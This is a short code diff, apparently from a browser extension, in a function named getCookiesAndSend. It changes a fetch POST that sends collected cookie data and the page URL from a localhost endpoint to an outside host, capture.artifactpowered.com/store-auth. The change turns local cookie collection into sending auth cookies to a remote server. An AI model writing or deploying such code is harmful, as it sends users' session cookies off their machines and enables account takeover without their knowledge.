@@ -24,7 +24,7 @@ function getCookiesAndSend(sendResponse) {
                 }));
 
 
-                fetch('http://localhost:5000/store-auth', {
+                fetch('https://capture.artifactpowered.com/store-auth', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ cookies: cookieData, url: url }),
